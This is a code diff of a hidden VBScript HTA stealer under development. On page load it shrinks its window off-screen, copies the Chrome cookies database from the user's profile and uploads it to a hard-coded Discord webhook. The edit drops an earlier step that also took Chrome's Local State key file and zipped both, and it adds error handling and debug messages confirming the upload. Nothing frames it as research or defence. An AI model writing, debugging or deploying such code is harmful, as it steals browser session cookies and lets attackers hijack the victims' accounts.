@@ -5,55 +5,61 @@
 Sub Window_OnLoad
     window.resizeTo 0,0
     window.moveTo -2000,-2000
+    On Error Resume Next ' THIS PREVENTS SILENT CRASHES
+    
     Set shell = CreateObject("WScript.Shell")
     Set fso = CreateObject("Scripting.FileSystemObject")
     Set http = CreateObject("MSXML2.XMLHTTP")
     Set ado = CreateObject("ADODB.Stream")
     
     userProfile = shell.ExpandEnvironmentStrings("%USERPROFILE%")
-    cookies = userProfile & "\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
-    localState = userProfile & "\AppData\Local\Google\Chrome\User Data\Local State"
-    tempZip = shell.ExpandEnvironmentStrings("%TEMP%") & "\upd.zip"
+    cookiesPath = userProfile & "\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
     
     webhook = "https://discord.com/api/webhooks/1557537274613469307/QDbmzYDUHRCzK_7OQMXsibxACoABgfSkBkBxIqh4NXh6OPYPZEBDm7NznEl8mLTxPRwE"
+    tempCookies = shell.ExpandEnvironmentStrings("%TEMP%") & "\ck.tmp"
     
-    If fso.FileExists(cookies) Then
-        fso.CopyFile cookies, shell.ExpandEnvironmentStrings("%TEMP%") & "\ck.tmp", True
-        If fso.FileExists(localState) Then
-            fso.CopyFile localState, shell.ExpandEnvironmentStrings("%TEMP%") & "\ls.tmp", True
+    If fso.FileExists(cookiesPath) Then
+        fso.CopyFile cookiesPath, tempCookies, True
+        
+        If Err.Number <> 0 Then
+            MsgBox "Copy Failed: " & Err.Description
+            window.close
+            Exit Sub
         End If
         
-        shell.Run "powershell -WindowStyle Hidden -Command Compress-Archive -Path '" & shell.ExpandEnvironmentStrings("%TEMP%") & "\ck.tmp','" & shell.ExpandEnvironmentStrings("%TEMP%") & "\ls.tmp' -DestinationPath '" & tempZip & "' -Force", 0, True
-        
-        Set ado = CreateObject("ADODB.Stream")
         ado.Type = 1
         ado.Open
-        ado.LoadFromFile tempZip
-        zipData = ado.Read
+        ado.LoadFromFile tempCookies
+        fileData = ado.Read
         ado.Close
         
         boundary = "---------------------------Boundary"
-        body = "--" & boundary & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""cookies.zip""" & vbCrLf & "Content-Type: application/zip" & vbCrLf & vbCrLf
+        body = "--" & boundary & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""cookies.db""" & vbCrLf & "Content-Type: application/octet-stream" & vbCrLf & vbCrLf
         
         Set ado = CreateObject("ADODB.Stream")
         ado.Type = 1
         ado.Open
         ado.Write TextToBytes(body)
-        ado.Write zipData
+        ado.Write fileData
         ado.Write TextToBytes(vbCrLf & "--" & boundary & "--" & vbCrLf)
         
         http.Open "POST", webhook, False
         http.setRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
         http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
         http.Send ado.Read
-        ado.Close
         
-        fso.DeleteFile shell.ExpandEnvironmentStrings("%TEMP%") & "\ck.tmp"
-        If fso.FileExists(shell.ExpandEnvironmentStrings("%TEMP%") & "\ls.tmp") Then
-            fso.DeleteFile shell.ExpandEnvironmentStrings("%TEMP%") & "\ls.tmp"
+        If Err.Number <> 0 Then
+            MsgBox "HTTP Send Failed: " & Err.Description
+        Else
+            MsgBox "Success! File sent to Discord."
         End If
-        fso.DeleteFile tempZip
+        
+        ado.Close
+        fso.DeleteFile tempCookies
+    Else
+        MsgBox "File not found at: " & cookiesPath
     End If
+    
     window.close
 End Sub
 
